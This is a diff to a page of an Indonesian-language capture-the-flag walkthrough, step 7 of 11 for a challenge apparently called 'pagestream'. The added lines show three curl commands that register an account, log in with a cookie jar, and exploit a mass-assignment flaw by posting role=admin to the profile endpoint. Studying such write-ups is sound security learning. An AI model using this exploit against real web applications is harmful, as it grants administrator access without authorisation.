@@ -2,6 +2,12 @@
 
 [← Overview](51-pagestream.md) · [Index](index.md)
 
+> **Langkah 7/11 — Eksploitasi / Solver.** Register, login, dan mass assignment:
+>
+> **Titik penting:** curl -sS -c cj -X POST -d "username=$USER&password=pw12345" "$BASE/register" · curl -sS -c cj -X POST -d "username=$USER&password=pw12345" "$BASE/login" · curl -sS -b cj -X POST -d 'role=admin&bio=pwned' "$BASE/profile"
+>
+> **Berikutnya:** [Output asli](51-pagestream-08-output-asli.md)
+
 ## 3.1 Strategi
 
 - Mass assign `role=admin`.
